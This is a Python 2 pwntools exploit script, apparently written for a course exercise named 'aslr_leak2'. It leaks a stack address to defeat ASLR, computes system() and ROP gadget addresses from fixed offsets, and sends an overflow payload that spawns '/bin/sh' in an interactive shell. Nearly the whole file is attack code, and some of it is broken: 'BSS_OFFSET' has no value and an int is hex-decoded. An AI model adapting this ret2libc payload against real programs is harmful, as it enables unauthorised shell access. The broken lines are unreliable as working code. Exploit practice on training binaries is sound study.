#!/usr/bin/env python2
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /levels/lecture/aslr/aslr_leak2
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('/levels/lecture/aslr/aslr_leak2')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

TRIGGER_LEAK = 'A' * 16  

def start(argv=[TRIGGER_LEAK], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break *0x{exe.symbols.main:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

SYSTEM_OFFSET = 1693328
BSS_OFFSET =    

add_esp_8_ebx_offset = 0x59a
pop_ebx_offset = 0x59d


a = io.recvuntil("Leaky buffer: " + TRIGGER_LEAK)

leaked_addr = int(io.recv(4)[::-1].encode('hex'), 16)

print leaked_addr.decode('hex')

system = ("%08x" % (leaked_addr - SYSTEM_OFFSET)).decode('hex')[::-1]

add_esp_8_ebx = ("%08x" % ((leaked_addr & 0xFFFFF000) + add_esp_8_ebx_offset)).decode('hex')[::-1]
pop_ebx = ("%08x" % ((leaked_addr & 0xFFFFF000) + pop_ebx_offset)).decode('hex')[::-1]

raw_input()

payload = 'A' * 28 + add_esp_8_ebx + 'JUNK' * 3 + system + '/bin/sh#'
#payload = 'A' * 28 + pop_ebx * 8 + 'JUNK' * 3 + system + '/bin/sh#'
#payload = 'A' * 28 + system + 'JUNK' +'/bin/sh#' + system + '/bin/sh#'

io.send(payload)

io.interactive()

